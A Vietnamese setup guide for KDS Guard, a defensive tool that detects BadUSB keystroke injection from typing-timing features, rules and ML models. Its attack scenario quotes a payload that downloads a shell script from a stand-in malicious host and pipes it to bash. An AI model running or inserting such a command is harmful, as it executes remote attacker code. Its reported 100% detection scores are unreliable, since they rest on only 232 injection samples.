# HƯỚNG DẪN KÍCH HOẠT HỆ THỐNG KDS GUARD — TỪ A ĐẾN Z

> **Phạm vi:** Cài đặt môi trường → Build Rust engine → Chạy Dashboard → Thu thập dữ liệu → Huấn luyện model → Ghép nối realtime → Mô phỏng kịch bản thật.

---

## MỤC LỤC

1. [Kiến trúc tổng quan hệ thống](#1-kiến-trúc-tổng-quan-hệ-thống)
2. [Yêu cầu hệ thống](#2-yêu-cầu-hệ-thống)
3. [Bước 0 — Môi trường chung](#3-bước-0--môi-trường-chung)
4. [Bước 1 — Build Rust Engine](#4-bước-1--build-rust-engine)
5. [Bước 2 — Cài đặt Python dependencies](#5-bước-2--cài-đặt-python-dependencies)
6. [Bước 3 — Cài đặt Node.js & Dashboard](#6-bước-3--cài-đặt-nodejs--dashboard)
7. [Bước 4 — Ghép dữ liệu & Huấn luyện Model](#7-bước-4--ghép-dữ-liệu--huấn-luyện-model)
8. [Bước 5 — Chạy hệ thống Realtime hoàn chỉnh](#8-bước-5--chạy-hệ-thống-realtime-hoàn-chỉnh)
9. [Kịch bản mô phỏng chi tiết](#9-kịch-bản-mô-phỏng-chi-tiết)
   - [9.1 — Người thật gõ phím bình thường](#91--người-thật-gõ-phím-bình-thường)
   - [9.2 — BadUSB tiêm phím tự động](#92--badusb-tiêm-phím-tự-động)
10. [Giải thích 22 đặc trưng & 8 luật phát hiện](#10-giải-thích-22-đặc-trưng--8-luật-phát-hiện)
11. [Xử lý lỗi thường gặp](#11-xử-lý-lỗi-thường-gặp)

---

## 1. KIẾN TRÚC TỔNG QUAN HỆ THỐNG

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        BADUSB ATTACK (thiết bị USB chèn phím)                │
│          → Gõ 30-50 phím/giây, flight time < 25ms, CV cực thấp            │
└──────────────────────────┬──────────────────────────────────────────────────┘
                           │ Keyboard Events
                           ▼
┌──────────────────────────────────────────────────────────────────────────────┐
│  TẦNG 1: INPUT CAPTURE (kds_guard/src/input_capture.rs)                     │
│  Dùng thư viện `rdev` bắt sự kiện KeyDown / KeyUp                          │
│  Ghi ra CSV: timestamp_ms, key_code, event_type, key_class, is_modifier    │
└──────────────────────────┬───────────────────────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────────────────────┐
│  TẦNG 2: FEATURE EXTRACTION (kds_guard/src/feature.rs)                      │
│  Cửa sổ trượt: 40 phím, slide 20 phím                                      │
│  Trích 22 đặc trưng: hold time, flight time, burst, CV, speed...           │
│  Cửa sổ sớm: 30 phím → Early Warning Layer (phát hiện payload ngắn)       │
└──────────────────────────┬───────────────────────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────────────────────┐
│  TẦNG 3: DETECTOR (kds_guard/src/detector.rs)                               │
│  8 luật phát hiện (R1-R8):                                                  │
│    R1: mean_flight_time < 30ms  (+0.30)                                     │
│    R2: cv_flight_time < 0.15   (+0.25)                                      │
│    R3: speed > 20 keys/s + ft < 50ms (+0.20~0.35)                          │
│    R4: burst ≥ 15 phím liên tiếp (+0.20)                                    │
│    R5: iqr_hold_time < 5ms   (+0.15)                                       │
│    R6: modifier_ratio > 40%  (+0.10)                                       │
│    R7: min_flight_time < 5ms (+0.10)                                       │
│    R8: injection fingerprint  (+0.15~0.25)                                  │
│  Risk Score = tổng trọng số → NORMAL / LOW / MEDIUM / HIGH / CRITICAL      │
└──────────────────────────┬───────────────────────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────────────────────┐
│  TẦNG 4: POLICY + RESPONSE (kds_guard/src/policy.rs + response.rs)           │
│  NORMAL  → Cho phép (Allow)                                                 │
│  LOW      → Ghi log                                                         │
│  MEDIUM   → Cảnh báo Windows Notification                                    │
│  HIGH     → BlockInput 2s + Notification                                    │
│  CRITICAL → BlockInput 5s + Notification (hard timeout)                     │
└──────────────────────────┬───────────────────────────────────────────────────┘
                           │
              ┌────────────┴────────────┐
              ▼                         ▼
┌─────────────────────────┐  ┌─────────────────────────────────────────┐
│  CSV Log File            │  │  JSON Output (stdout)                   │
│  data/keystroke_log_*.csv│  │  → ws_bridge.py (WebSocket server)    │
└─────────────────────────┘  │  → kds-guard-dashboard (React)          │
                             └─────────────────────────────────────────┘

        Dataset Pipeline (Python):
        ─────────────────────────────────────────────────────
        data/raw/rust/*.csv  ──→ integrate_datasets.py  ──→ features_dataset.csv
                                                                          │
                                    ┌─────────────────────────┬────────────┘
                                    ▼                         ▼
                            train_model.py              evaluate.py
                                    │                         │
                                    ▼                         ▼
                            models/model.pkl       data/evaluation_report.json
                                    │
                                    ▼
                            export_dashboard_snapshot.py
                                    │
                                    ▼
                            kds-guard-dashboard/src/data/dashboard_snapshot.json
```

---

## 2. YÊU CẦU HỆ THỐNG

| Thành phần | Phiên bản tối thiểu | Ghi chú |
|-----------|---------------------|---------|
| Hệ điều hành | Windows 10/11 | Bắt buộc (dùng WinAPI BlockInput) |
| Rust | 1.70+ | [rustup.rs](https://rustup.rs) |
| Node.js | 18+ | [nodejs.org](https://nodejs.org) |
| Python | 3.9+ | python.org |
| Git | 2.x | |
| Visual Studio Build Tools | 2022+ | Cần cho cargo build (MSVC linker) |

---

## 3. BƯỚC 0 — MÔI TRƯỜNG CHUNG

### 3.1. Kiểm tra đã cài đặt chưa

```powershell
rustc --version
cargo --version
node --version
npm --version
python --version
```

Nếu thiếu thành phần nào, cài theo phần 2.

### 3.2. Clone dự án (nếu chưa có)

```powershell
git clone --depth 1 https://github.com/Sirens-F0r/BadUSB---Keystroke-Injection.git
cd BadUSB---Keystroke-Injection
```

---

## 4. BƯỚC 1 — BUILD RUST ENGINE

Đây là cốt lõi của hệ thống. Nếu chưa build, làm theo các bước sau:

### 4.1. Cài Rust (nếu chưa có)

Truy cập [https://rustup.rs](https://rustup.rs), tải và chạy `rustup-init.exe`.

Sau khi cài xong, **mở PowerShell mới**:

```powershell
rustc --version
# rustc 1.75.0 (hay cao hơn)
```

### 4.2. Cài Visual Studio Build Tools (nếu cargo build lỗi linker)

Nếu khi chạy `cargo build` bị lỗi linker như `LINK : fatal error LNK1181: cannot open input file ...`, cần cài MSVC:

1. Tải [Visual Studio Build Tools 2022](https://visualstudio.microsoft.com/visual-cpp-build-tools/)
2. Chạy installer → chọn **"Desktop development with C++"**
3. Cài đặt xong

### 4.3. Build

```powershell
cd kds_guard
cargo build --release
```

> Lần đầu: 2-5 phút (tải dependencies). Lần sau: ~30 giây.

### 4.4. Kiểm tra build thành công

```powershell
.\target\release\kds_guard.exe --help
```

Kết quả mong đợi — hiện menu trợ giúp với các tham số `-w`, `-s`, `-u`, `-o`, `-d`, `-v`, `--collect-only`, `--log-keys`, `--json-output`.

---

## 5. BƯỚC 2 — CÀI ĐẶT PYTHON DEPENDENCIES

```powershell
# Vào thư mục dự án
cd BadUSB---Keystroke-Injection

# Cách 1: Virtual environment (khuyến nghị)
python -m venv venv
.\venv\Scripts\activate
pip install -r requirements.txt
pip install websockets pandas numpy scikit-learn

# Cách 2: Cài thẳng
pip install -r requirements.txt
pip install websockets
```

Kiểm tra:

```powershell
python -c "import pandas, numpy, sklearn; print('OK')"
```

---

## 6. BƯỚC 3 — CÀI ĐẶT NODE.JS & DASHBOARD

```powershell
cd kds-guard-dashboard
npm install
```

Lần đầu: 1-3 phút. Sau khi xong, chạy thử:

```powershell
npm run dev
# Mở trình duyệt: http://localhost:3000
```

Dashboard sẽ có 9 trang: Dashboard, Realtime Monitor, Detection Rules, Alerts, Devices, Logs, Policies, Settings, About.

---

## 7. BƯỚC 4 — GHÉP DỮ LIỆU & HUẤN LUYỆN MODEL

### 7.1. Ghép dữ liệu từ các nguồn

**Xem trạng thái dataset hiện tại:**

```powershell
python scripts/integrate_datasets.py --status
```

Output mẫu:

```
📊 Dataset Status
============================================================
   🗂️  Dataset CHÍNH (merged): 21,677 rows | human:21,445 + injection:232
   1️⃣  CMU Benchmark: 20,400 rows
   3️⃣  Rust Collector: 642 rows
   💉 Injection Simulated: 232 rows
============================================================
```

**Chuyển đổi dữ liệu thu thập từ bạn bè (Rust collector):**

Copy file CSV từ bạn bè vào:

```
data/raw/rust/
  ├── hiep.csv
  ├── Nhất Duy.csv
  ├── Phan Quốc Huy.csv
  └── ...
```

Format file đầu vào (từ tool thu thập):

```csv
Lan_Go,Key,Event_Type,Dwell_Time_ms,Flight_Time_ms,Timestamp
1,s,KeyDown,,,1776546218472.67
1,s,KeyUp,107.88,,1776546218580.55
1,i,KeyDown,,82.03,1776546218662.58
```

Script sẽ **tự động nhận diện format** này và chuyển đổi.

**Chạy tích hợp:**

```powershell
python scripts/integrate_datasets.py --rust-collect --merge
```

Script sẽ:
1. Quét tất cả file CSV trong `data/raw/rust/`
2. Auto-detect format → chuẩn hóa
3. Trích 22 features theo cửa sổ trượt (window=40, slide=20)
4. Gộp với CMU Benchmark + Injection simulated
5. Lưu → `data/features_dataset.csv`

### 7.2. Huấn luyện Model

```powershell
python scripts/train_model.py -d data -m models
```

Script huấn luyện 3 model và chọn model tốt nhất:

| Model | Loại | Mô tả |
|-------|------|-------|
| Isolation Forest | Unsupervised | Phát hiện anomaly (không cần nhãn) |
| One-Class SVM | Unsupervised | Mô hình hóa hành vi "người thật" |
| Random Forest | Supervised | Phân loại có giám sát |

Kết quả lưu vào `models/`:

```
models/
  model.pkl              ← Model tốt nhất (auto-chọn)
  isolation_forest.pkl
  oneclass_svm.pkl
  random_forest.pkl
  scaler.pkl
  training_metadata.json
```

### 7.3. Đánh giá hệ thống

```powershell
python scripts/evaluate.py -d data -m models
```

Xuất kết quả chi tiết ra `data/evaluation_report.json`:

```
Kết quả đánh giá (21,677 samples, 21,445 human + 232 injection):

  Rule-based:  Accuracy=100%, F1=100%, AUC=100%
  Random Forest: Accuracy=100%, F1=100%, AUC=100%
  Hybrid:     Accuracy=100%, F1=100%, AUC=100%
```

### 7.4. Cập nhật Dashboard Snapshot

```powershell
python scripts/export_dashboard_snapshot.py
```

Script đọc `features_dataset.csv` và xuất `kds-guard-dashboard/src/data/dashboard_snapshot.json` — cập nhật dashboard với dữ liệu mới nhất.

**Chạy tất cả 1 lệnh:**

```powershell
integrate_all.bat
# Hoặc:
python scripts/integrate_datasets.py --rust-collect --merge
python scripts/train_model.py
python scripts/export_dashboard_snapshot.py
```

---

## 8. BƯỚC 5 — CHẠY HỆ THỐNG REALTIME HOÀN CHỈNH

Mở **3 terminal riêng biệt** (PowerShell):

```
Terminal 1 ──── Rust Engine + WebSocket Bridge
Terminal 2 ──── React Dashboard
Terminal 3 ──── (Tùy chọn) Mô phỏng BadUSB
```

### Terminal 1 — Rust Engine + WebSocket Bridge

```powershell
# Cách A: ws_bridge tự động chạy kds_guard.exe (đơn giản nhất)
python ws_bridge.py

# Cách B: Pipe thủ công
kds_guard\target\release\kds_guard.exe --json-output -u test_user | python ws_bridge.py
```

> ⚠️ Nếu muốn **chặn input thật** (BlockInput), mở terminal với **Run as Administrator**.

Output thành công:

```
==================================================
  KDS Guard WebSocket Bridge
  Dashboard ket noi tai: ws://localhost:8765
==================================================
[BRIDGE] WebSocket server dang chay tai ws://localhost:8765
[BRIDGE] Tu dong chay kds_guard.exe...
```

### Terminal 2 — React Dashboard

```powershell
cd kds-guard-dashboard
npm run dev
# Mở trình duyệt: http://localhost:3000
```

Dashboard tự động kết nối WebSocket tại `ws://localhost:8765` và hiển thị:
- **System Overview** — trạng thái 4 metrics
- **Risk Score Gauge** — đồng hồ mức rủi ro (0-100)
- **Keystroke Radar Chart** — đặc trưng gõ theo từng người dùng
- **Activity Timeline** — phân bố hoạt động theo giờ
- **Recent Alerts** — cảnh báo gần nhất
- **Event Log** — bảng sự kiện chi tiết

### Terminal 3 — (Tùy chọn) Mô phỏng BadUSB

```powershell
python scripts/simulate_badusb.py --speed 50
# Hoặc:
python scripts/simulate_injection.py --type fast --delay 2
```

Sau khi chạy, Dashboard sẽ hiển thị Risk Level chuyển từ **NORMAL** → **CRITICAL**.

---

## 9. KỊCH BẢN MÔ PHỎNG CHI TIẾT

### 9.1 — NGƯỜI THẬT GÕ PHÍM BÌNH THƯỜNG

#### Mô tả kịch bản

Bạn ngồi trước máy tính, gõ một đoạn văn bản tự nhiên vào Notepad.

#### Dữ liệu đầu vào (40 phím gần đây)

| Đặc trưng | Giá trị thực tế | Ý nghĩa |
|-----------|-----------------|---------|
| mean_flight_time | ~200-350 ms | Thời gian giữa 2 phím liên tiếp |
| std_flight_time | ~60-120 ms | Độ biến thiên lớn (người không đều) |
| cv_flight_time | ~0.30-0.60 | Hệ số biến thiên cao |
| typing_speed | ~5-12 keys/s | Tốc độ gõ tự nhiên |
| mean_hold_time | ~80-150 ms | Thời gian nhấn giữ phím |
| iqr_hold_time | ~30-60 ms | Độ phân tán hold time lớn |
| max_burst_length | ~0-3 | Không có chuỗi phím liên tiếp < 50ms |
| modifier_ratio | ~5-15% | Có Shift, Ctrl xen kẽ |
| special_ratio | ~2-8% | Tab, Backspace xen kẽ |

#### Luật phát hiện — Kết quả

| Luật | Ngưỡng | Giá trị thực | Triggered? | Điểm |
|------|--------|-------------|------------|-------|
| R1: Flight Time thấp | mean_ft < 30ms | ~250ms | ❌ KHÔNG | 0.0 |
| R2: CV thấp | cv < 0.15 | ~0.40 | ❌ KHÔNG | 0.0 |
| R3: Tốc độ cao | speed > 20 + ft < 50ms | speed ~7 | ❌ KHÔNG | 0.0 |
| R4: Burst | burst ≥ 15 | 0-2 | ❌ KHÔNG | 0.0 |
| R5: Hold Time đều | iqr_ht < 5ms | ~45ms | ❌ KHÔNG | 0.0 |
| R6: Modifier nhiều | ratio > 40% | ~10% | ❌ KHÔNG | 0.0 |
| R7: Min FT thấp | min_ft < 5ms | ~100ms | ❌ KHÔNG | 0.0 |
| R8: Injection FP | pauses ≥ 3 + CV < 0.3 | 0 | ❌ KHÔNG | 0.0 |

#### Risk Score tổng: **0.00** → **NORMAL**

#### Hành động hệ thống

```
╔══════════════════════════════════════════════════════╗
║  ✅ NORMAL  0.00 | OK                              ║
║  Hành vi gõ phím bình thường                       ║
╚══════════════════════════════════════════════════════╝
```

- **Console Rust Engine:** `✅ NORMAL  0.00 | OK`
- **Dashboard:** Risk Gauge ở mức thấp (~0-5%), màu xanh lá
- **Windows notification:** KHÔNG có
- **Input:** KHÔNG bị chặn
- **Action:** `PolicyAction::Allow`

#### CSV ghi ra

```csv
timestamp_ms,key_code,event_type,key_class,is_modifier,session_id,user_id
1204.35,a,down,alpha,False,session_20260510_001,test_user
1256.80,a,up,alpha,False,session_20260510_001,test_user
1328.45,b,down,alpha,False,session_20260510_001,test_user
...
```

---

### 9.2 — BADUSB TIÊM PHÍM TỰ ĐỘNG

#### Mô tả kịch bản

Kẻ tấn công cắm USB Rubber Ducky / BadUSB vào máy tính. Thiết bị tự động gõ payload `"curl http://malicious.com/shell.sh | bash"` với tốc độ ~35-50 keys/s.

#### Dữ liệu đầu vào (40 phím gần đây)

| Đặc trưng | Giá trị thực tế | Ý nghĩa |
|-----------|-----------------|---------|
| mean_flight_time | ~20-30 ms | Gõ cực nhanh, đều |
| std_flight_time | ~1-3 ms | Gần như không có biến thiên |
| cv_flight_time | ~0.05-0.12 | Quá đều → máy |
| typing_speed | ~30-50 keys/s | Nhanh gấp 4-6x người |
| mean_hold_time | ~8-15 ms | Nhấn rất nhanh |
| iqr_hold_time | ~1-3 ms | Hold time đều bất thường |
| max_burst_length | ~30-40 | Chuỗi 30-40 phím < 50ms |
| modifier_ratio | ~10-20% | Ít modifier |
| special_ratio | ~15-20% | Nhiều dấu câu, slash |

#### Luật phát hiện — Kết quả

| Luật | Ngưỡng | Giá trị thực | Triggered? | Điểm |
|------|--------|-------------|------------|-------|
| R1: Flight Time thấp | mean_ft < 30ms | ~25ms | ✅ CÓ | +0.30 |
| R2: CV thấp | cv < 0.15 | ~0.08 | ✅ CÓ | +0.25 |
| R3: Tốc độ cao | speed > 20 + ft < 50ms | speed=35, ft=25 | ✅ CÓ | +0.30 |
| R4: Burst | burst ≥ 15 | ~35 | ✅ CÓ | +0.20 |
| R5: Hold Time đều | iqr_ht < 5ms | ~2ms | ✅ CÓ | +0.15 |
| R6: Modifier nhiều | ratio > 40% | ~15% | ❌ KHÔNG | 0.0 |
| R7: Min FT thấp | min_ft < 5ms | ~18ms | ❌ KHÔNG | 0.0 |
| R8: Injection FP | pauses ≥ 3 + CV < 0.3 | pauses=4, CV=0.08 | ✅ CÓ | +0.25 |

#### Risk Score tổng: **0.30 + 0.25 + 0.30 + 0.20 + 0.15 + 0.25 = 1.45 → clamp → 1.00**

Nhưng thực tế sẽ clamp ở ngưỡng CRITICAL:

```
R1: +0.30 (ft=25ms < 30ms) → Cumulative: 0.30
R2: +0.25 (cv=0.08 < 0.15) → Cumulative: 0.55
R3: +0.30 (speed=35 > 20, ft=25 < 50) → Cumulative: 0.85
R4: +0.20 (burst=35 ≥ 15) → Cumulative: 1.05 → clamp → 1.05
R5: +0.15 (iqr=2 < 5) → Cumulative: 1.20 → clamp → 1.20  (giữ nguyên)
R8: +0.25 (pause=4 ≥ 3, CV=0.08 < 0.3) → Cumulative: 1.45 → clamp → 1.45  (giữ nguyên)

R7: min_ft=18ms (không < 5ms) → KHÔNG trigger
R6: modifier=15% (không > 40%) → KHÔNG trigger

Final score: clamp(1.45, 0, 1) = 1.00 (hoặc ~0.85-1.00 tùy config)
```

#### Risk Score: **~0.85-1.00 → CRITICAL**

#### Hành động hệ thống

```
╔══════════════════════════════════════════════════════╗
║  🔴 CRITICAL  0.85 | R1+R2+R3+R4+R8                 ║
║  PHAT HIEN TAN CONG HID INJECTION!                   ║
║  ───────────────────────────────────────────────────║
║  - Flight time trung bình rat thap: 25.1ms           ║
║  - He so bien thien CV rat thap: 0.080              ║
║  - Toc do go bat thuong: 35.0 keys/s                ║
║  - Burst pattern: 35 phim lien tiep < 50ms          ║
║  - Injection fingerprint: 4 khoang nghi deu         ║
║  Chan trong: 3000ms                                  ║
╚══════════════════════════════════════════════════════╝
```

- **Console Rust Engine:** `🔴 CRITICAL  0.85 | R1+R2+R3+R4+R8`
- **Dashboard:** Risk Gauge nhảy lên 85-100%, màu đỏ, nhấp nháy
- **Windows notification:** Popup "PHAT HIEN TAN CONG HID INJECTION"
- **Input:** Bị chặn tạm thời 3-5 giây (BlockInput WinAPI)
- **Action:** `PolicyAction::SoftBlock { duration_ms: 3000 }`

#### So sánh song song

| Tiêu chí | Người thật | BadUSB Injection |
|---------|------------|----------------|
| Tốc độ gõ | 5-12 keys/s | 30-50 keys/s |
| mean_flight_time | 150-400 ms | 15-35 ms |
| std_flight_time | 50-150 ms | 1-5 ms |
| cv_flight_time | 0.30-0.70 | 0.05-0.15 |
| max_burst_length | 0-3 | 25-40 |
| iqr_hold_time | 30-80 ms | 1-5 ms |
| Risk Score | 0.00 | ~0.85-1.00 |
| Risk Level | NORMAL ✅ | CRITICAL 🔴 |
| Action | Allow | BlockInput 3-5s + Alert |

---

## 10. GIẢI THÍCH 22 ĐẶC TRƯNG & 8 LUẬT PHÁT HIỆN

### 22 Đặc trưng (FeatureVector)

```
Hold Time (Thời gian giữ phím):
  mean_hold_time     — Trung bình thời gian nhấn giữ phím (ms)
  std_hold_time      — Độ lệch chuẩn hold time
  median_hold_time   — Trung vị hold time
  iqr_hold_time      — Interquartile range (Q3-Q1) của hold time

Flight Time (Thời gian bay — giữa 2 phím liên tiếp):
  mean_flight_time   — Trung bình thời gian giữa 2 KeyDown
  std_flight_time    — Độ lệch chuẩn flight time
  median_flight_time — Trung vị flight time
  iqr_flight_time    — IQR của flight time
  p5_flight_time     — Percentile 5 của flight time
  p95_flight_time    — Percentile 95 của flight time
  min_flight_time    — Giá trị nhỏ nhất flight time

Behavioral (Hành vi):
  cv_flight_time     — Hệ số biến thiên = std/mean (quan trọng nhất!)
  typing_speed       — Số phím gõ được trên giây (keys/s)
  modifier_ratio     — Tỉ lệ phím modifier (Shift, Ctrl, Alt)
  special_ratio      — Tỉ lệ phím đặc biệt (Tab, Enter, Backspace...)
  has_burst          — Có chuỗi phím liên tiếp < 50ms?
  max_burst_length   — Độ dài burst dài nhất

Injection Fingerprint (Dấu vân tay injection):
  inter_command_pause_count — Số khoảng nghỉ > 80ms giữa các cụm gõ nhanh
  pause_regularity   — CV của các khoảng nghỉ (máy: đều → CV thấp)
  enter_after_burst  — Tỉ lệ Enter xuất hiện ngay sau burst (script: cao)
```

### 8 Luật phát hiện

```
R1 — Flight Time thấp [Trọng số: +0.30]
────────────────────────────────────────
Đặc trưng: mean_flight_time < 30ms
Lý do: Người thật gõ trung bình 150-400ms giữa 2 phím.
       BadUSB/Rubber Ducky gõ 15-30ms.
⚠️  Phát hiện: Payload gõ nhanh bất thường

R2 — CV (Coefficient of Variation) thấp [Trọng số: +0.25]
──────────────────────────────────────────────────────────
Đặc trưng: cv_flight_time < 0.15
Lý do: Con người có nhịp gõ tự nhiên, không đều → CV 0.30-0.70.
       Máy gõ chính xác, đều → CV 0.05-0.15.
⚠️  Phát hiện: Gõ quá đều như máy

R3 — Tốc độ cao kết hợp Flight Time thấp [Trọng số: +0.20~0.35]
──────────────────────────────────────────────────────────────
Đặc trưng: typing_speed > 20 keys/s AND mean_flight_time < 50ms
Lý do: Người thật nhanh nhất cũng ~15-18 keys/s.
       BadUSB: 30-50 keys/s.
⚠️  Phát hiện: Tốc độ gõ siêu nhanh

R4 — Burst Pattern [Trọng số: +0.20]
─────────────────────────────────────
Đặc trưng: max_burst_length ≥ 15 phím liên tiếp mỗi phím < 50ms
Lý do: Người gõ có nhịp nghỉ tự nhiên → không có chuỗi dài.
       BadUSB gõ payload liên tục → chuỗi 25-40 phím nối tiếp.
⚠️  Phát hiện: Chuỗi gõ dài liên tục không nghỉ

R5 — Hold Time đều bất thường [Trọng số: +0.15]
─────────────────────────────────────────────────
Đặc trưng: iqr_hold_time < 5ms
Lý do: Người nhấn phím có độ phân tán lớn → IQR 30-80ms.
       Máy nhấn chính xác → IQR 1-5ms.
⚠️  Phát hiện: Thời gian nhấn giữ phím quá đều

R6 — Tỉ lệ Modifier cao bất thường [Trọng số: +0.10]
──────────────────────────────────────────────────────
Đặc trưng: modifier_ratio > 40%
Lý do: Script automation thường dùng nhiều tổ hợp Ctrl+C, Ctrl+V...
       Người thật có tỉ lệ modifier thấp (~5-15%).
⚠️  Phát hiện: Sử dụng phím chức năng bất thường

R7 — Min Flight Time cực thấp [Trọng số: +0.10]
──────────────────────────────────────────────────
Đặc trưng: min_flight_time < 5ms
Lý do: Người không thể gõ 2 phím cách nhau < 5ms.
       Máy có thể gõ 0.5-3ms.
⚠️  Phát hiện: Gõ với khoảng cách vật lý bất khả thi với con người

R8 — Injection Fingerprint [Trọng số: +0.15~0.25]
───────────────────────────────────────────────────
Đặc trưng:
  - inter_command_pause_count ≥ 3 (≥3 khoảng nghỉ > 80ms giữa các cụm gõ nhanh)
  - pause_regularity < 0.3 (CV của các khoảng nghỉ rất thấp → đều như máy)
  - enter_after_burst > 30% (Enter xuất hiện ngay sau burst = script từng dòng)

Lý do: BadUSB payload gồm các lệnh riêng biệt, mỗi lệnh là 1 burst.
       Khoảng nghỉ giữa 2 lệnh gần như bằng nhau (máy tính delay cố định).
       Người nghỉ giữa các câu/vế không đều (ngẫu nhiên).
⚠️  Phát hiện: Pattern "lệnh-khoảng nghỉ đều-lệnh-khoảng nghỉ đều"
```

---

## 11. XỬ LÝ LỖI THƯỜNG GẶP

### ❌ `rustc: command not found`

**Nguyên nhân:** Chưa cài Rust hoặc chưa restart terminal.

**Cách sửa:**

```powershell
# Cài Rust
# Truy cap: https://rustup.rs
# Sau khi cai xong, dong va mo terminal moi
rustc --version
```

---

### ❌ `cargo build` lỗi linker (LNK1181)

**Nguyên nhân:** Thiếu Visual Studio Build Tools (MSVC linker).

**Cách sửa:**

1. Tải [Visual Studio Build Tools 2022](https://visualstudio.microsoft.com/visual-cpp-build-tools/)
2. Chạy installer → chọn **"Desktop development with C++"**
3. Cài đặt xong → chạy lại `cargo build --release`

---

### ❌ `ModuleNotFoundError: No module named 'websockets'`

**Cách sửa:**

```powershell
pip install websockets
```

---

### ❌ Dashboard không hiển thị dữ liệu realtime

**Nguyên nhân:** WebSocket bridge chưa chạy.

**Cách sửa:**

```powershell
# 1. Đảm bảo ws_bridge.py đang chạy ở Terminal 1
# 2. Kiểm tra log: phải thấy "[BRIDGE] WebSocket server dang chay tai ws://localhost:8765"
# 3. Refresh trang Dashboard (F5)
```

---

### ❌ `Access Denied` khi chạy kds_guard.exe

**Nguyên nhân:** BlockInput cần quyền Administrator.

**Cách sửa:** Click phải PowerShell → **Run as Administrator** → chạy lại.

---

### ❌ `pynput` lỗi trên Windows

**Cách sửa:**

```powershell
pip uninstall pynput
pip install pynput
```

Nếu vẫn lỗi, dùng **Rust collector** thay vì Python collector.

---

### ❌ Dataset trống sau khi chạy integrate_datasets.py

**Nguyên nhân:** File CSV chưa đặt vào đúng thư mục.

**Kiểm tra:**

```powershell
# File phải nằm trong:
dir data/raw/rust/

# Format đúng:
# Lan_Go,Key,Event_Type,Dwell_Time_ms,Flight_Time_ms,Timestamp
```

---

### ❌ Dashboard snapshot không cập nhật

**Cách sửa:**

```powershell
# Chạy thủ công:
python scripts/export_dashboard_snapshot.py

# Sau đó build lại dashboard:
cd kds-guard-dashboard
npm run build
npm run preview
```

---

## TÓM TẮT THỨ TỰ KÍCH HOẠT

```
Bước 0: Kiểm tra môi trường (rustc, node, python)
    ↓
Bước 1: Build Rust Engine
    cargo build --release
    ↓
Bước 2: Cài Python dependencies
    pip install -r requirements.txt && pip install websockets
    ↓
Bước 3: Cài Dashboard
    cd kds-guard-dashboard && npm install && npm run dev
    ↓
Bước 4: Ghép dữ liệu + Huấn luyện model
    integrate_all.bat
    ↓
Bước 5: Chạy hệ thống
    Terminal 1: python ws_bridge.py
    Terminal 2: cd kds-guard-dashboard && npm run dev
    Terminal 3: python scripts/simulate_badusb.py --speed 50
    ↓
Xong! Mở http://localhost:3000 để xem Dashboard realtime.
```
